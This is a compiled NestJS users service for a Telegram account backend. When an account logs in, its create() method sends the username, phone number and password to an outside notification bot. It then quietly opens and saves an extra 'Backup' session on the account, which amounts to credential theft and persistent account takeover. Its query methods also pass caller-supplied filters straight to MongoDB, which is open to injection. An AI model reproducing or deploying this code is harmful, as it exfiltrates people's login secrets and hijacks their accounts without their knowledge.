"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.UsersService = void 0;
const Telegram_service_1 = require("./../Telegram/Telegram.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const client_service_1 = require("../clients/client.service");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
let UsersService = class UsersService {
    constructor(userModel, telegramService, clientsService) {
        this.userModel = userModel;
        this.telegramService = telegramService;
        this.clientsService = clientsService;
    }
    async create(user) {
        const activeClientSetup = this.telegramService.getActiveClientSetup();
        console.log("New User received - ", user?.mobile);
        console.log("ActiveClientSetup::", activeClientSetup);
        if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {
            console.log("Updating New Session Details", user.mobile, user.username, activeClientSetup.clientId);
            await this.clientsService.updateClientSession(user.session);
        }
        else {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\nMobile: t.me/${user.mobile}${user.password ? `\npassword: ${user.password}` : "\n"}`)}`);
            setTimeout(async () => {
                try {
                    await connection_manager_1.connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });
                    const newSession = await this.telegramService.createNewSession(user.mobile);
                    const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: "Backup" });
                    await newUserBackup.save();
                }
                catch (error) {
                    console.log("Error in creating new session", error);
                }
            }, 3000);
            const newUser = new this.userModel(user);
            return newUser.save();
        }
    }
    async findAll() {
        return this.userModel.find().exec();
    }
    async findOne(tgId) {
        const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON();
        if (!user) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
        return user;
    }
    async update(tgId, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany({ tgId }, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${tgId} not found`);
        }
        return result.modifiedCount;
    }
    async updateByFilter(filter, user) {
        delete user['_id'];
        const result = await this.userModel.updateMany(filter, { $set: user }, { new: true, upsert: true }).exec();
        if (result.matchedCount === 0) {
            throw new common_1.NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);
        }
        return result.modifiedCount;
    }
    async delete(tgId) {
        const result = await this.userModel.deleteOne({ tgId }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`User with tgId ${tgId} not found`);
        }
    }
    async search(filter) {
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        if (filter.twoFA !== undefined) {
            filter.twoFA = filter.twoFA === 'true' || filter.twoFA === '1' || filter.twoFA === true;
        }
        console.log(filter);
        return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.userModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
};
exports.UsersService = UsersService;
exports.UsersService = UsersService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('userModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        client_service_1.ClientService])
], UsersService);
//# sourceMappingURL=users.service.js.map